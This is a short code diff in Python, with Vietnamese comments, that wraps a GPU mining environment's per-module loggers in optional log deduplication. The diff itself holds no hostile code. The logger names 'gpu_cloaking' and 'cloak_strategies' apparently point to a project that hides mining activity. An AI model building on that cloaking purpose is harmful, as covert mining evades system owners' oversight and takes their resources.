@@ -17,12 +17,32 @@ LOGS_DIR = os.getenv('LOGS_DIR', '/app/mining_environment/logs')
 Path(LOGS_DIR).mkdir(parents=True, exist_ok=True)
 
 # **Dedicated Module Loggers** (Logger mô-đun chuyên dụng – bộ ghi nhật ký riêng cho từng module)
-gpu_plugin_logger = setup_logging('gpu_plugin', str(Path(LOGS_DIR) / 'gpu_plugin.log'), 'INFO')
-gpu_cloaking_logger = setup_logging('gpu_cloaking', str(Path(LOGS_DIR) / 'cloak_strategies.log'), 'INFO')  # **Fixed** (đã sửa): dùng cloak_strategies.log thay vì gpu_cloaking.log
-gpu_optimization_logger = setup_logging('gpu_optimization', str(Path(LOGS_DIR) / 'gpu_optimization.log'), 'INFO')
-mining_performance_logger = setup_logging('mining_performance', str(Path(LOGS_DIR) / 'mining_performance.log'), 'INFO')
-audit_integration_logger = setup_logging('audit_integration', str(Path(LOGS_DIR) / 'audit_integration.log'), 'INFO')
-gpu_monitoring_logger = setup_logging('gpu_monitoring', str(Path(LOGS_DIR) / 'gpu_monitoring.log'), 'INFO')
+# Enable deduplication for high-frequency loggers
+ENABLE_DEDUPLICATION = os.getenv('ENABLE_LOG_DEDUP', 'true').lower() == 'true'
+
+# Create base loggers
+_gpu_plugin_logger = setup_logging('gpu_plugin', str(Path(LOGS_DIR) / 'gpu_plugin.log'), 'INFO')
+_gpu_cloaking_logger = setup_logging('gpu_cloaking', str(Path(LOGS_DIR) / 'cloak_strategies.log'), 'INFO')  # **Fixed** (đã sửa): dùng cloak_strategies.log thay vì gpu_cloaking.log
+_gpu_optimization_logger = setup_logging('gpu_optimization', str(Path(LOGS_DIR) / 'gpu_optimization.log'), 'INFO')
+_mining_performance_logger = setup_logging('mining_performance', str(Path(LOGS_DIR) / 'mining_performance.log'), 'INFO')
+_audit_integration_logger = setup_logging('audit_integration', str(Path(LOGS_DIR) / 'audit_integration.log'), 'INFO')
+_gpu_monitoring_logger = setup_logging('gpu_monitoring', str(Path(LOGS_DIR) / 'gpu_monitoring.log'), 'INFO')
+
+# Wrap with deduplication if enabled
+if ENABLE_DEDUPLICATION:
+    gpu_plugin_logger = wrap_logger_with_deduplication(_gpu_plugin_logger, use_global=True)
+    gpu_cloaking_logger = wrap_logger_with_deduplication(_gpu_cloaking_logger, use_global=True)
+    gpu_optimization_logger = wrap_logger_with_deduplication(_gpu_optimization_logger, use_global=True)
+    mining_performance_logger = wrap_logger_with_deduplication(_mining_performance_logger, use_global=True)
+    audit_integration_logger = wrap_logger_with_deduplication(_audit_integration_logger, use_global=True)
+    gpu_monitoring_logger = wrap_logger_with_deduplication(_gpu_monitoring_logger, use_global=True)
+else:
+    gpu_plugin_logger = _gpu_plugin_logger
+    gpu_cloaking_logger = _gpu_cloaking_logger
+    gpu_optimization_logger = _gpu_optimization_logger
+    mining_performance_logger = _mining_performance_logger
+    audit_integration_logger = _audit_integration_logger
+    gpu_monitoring_logger = _gpu_monitoring_logger
 
 def get_gpu_plugin_logger():
     """
